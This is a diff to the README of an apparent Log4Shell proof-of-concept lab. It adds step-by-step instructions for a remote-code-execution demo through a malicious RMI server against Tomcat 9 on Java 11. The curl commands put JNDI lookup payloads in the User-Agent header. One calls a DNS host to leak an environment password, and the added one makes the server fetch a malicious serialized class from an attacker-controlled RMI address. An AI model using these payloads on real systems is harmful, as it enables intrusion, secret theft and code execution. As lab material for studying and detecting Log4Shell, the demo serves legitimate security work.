@@ -12,6 +12,8 @@ This demo tomcat server (Tomcat 8.5.3, Java 1.8.0u51) has been reconfigued to us
 
 A newer Bitnami server is now available on port 8888. It is also is configured for Log4J2 logging and is running Tomcat 9.0.55 and OpenJDK 11.0.13.
 
+The RMI exploit against the Tomcat 9 / Java 11 server is described here: https://www.veracode.com/blog/research/exploiting-jndi-injections-java (Jan 3, 2019) by Michael Stepankin
+
 The detection script will check for user-agent vulnerablities and is from here: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
  
 
@@ -65,6 +67,35 @@ docker-compose build
 1. In a second terminal, run the following. The IP is the ip address of the docker host
     1. `curl -A "\${jndi:dns://10.10.10.31/\${env:POC_PASSWORD}}" http://10.10.10.31:8888/log4shell/`
 1. The vulnerable web server will attempt to do a TXT lookup at the given IP. See log4j-dns_exfil.pcap
+
+
+### Run an RMI RCE Demo on Recent Java 11 version
+
+I am having issues with command line arg for ping target. So you have to compile yourself.
+
+#### Compile 
+1. Start the docker containers in a terminal
+    1. `docker-compose up`
+1. In another terminal, Login to the cve-poc
+    1. `docker exec -it log4j-poc_cve-poc_1 /bin/bash`
+1. Kill running RMIServerPOC instance
+1. Change to rmi-poc directory
+    1. `cd /home/user/rmi-poc`
+1. Edit RMIServerPOC.java to change 10.10.10.31 to your ping target
+1. Recompile
+    1. `javac -cp catalina.jar:. RMIServerPOC.java`
+1. Run the Server
+    1. `javac -cp catalina.jar:. RMIServerPOC 127.0.0.1`
+
+#### Run RMI RCE Demo
+
+1. Start the docker containers in a terminal
+    1. `docker-compose up`
+1. In a second terminal, run the following. The IP is the ip address of the docker host
+    1. `curl -A "\${jndi:rmi://172.16.238.11:1097/Object}" http://10.10.10.31:8888/`
+1. The vulnerable web server will download a serialized malicious class from the RMI server for a class which already exists in the Tomcat environment.
+1. This will ping the IP address defined in the compile section. 
+
 
 ### Detect UA Vulnerability
 1. cd scripts
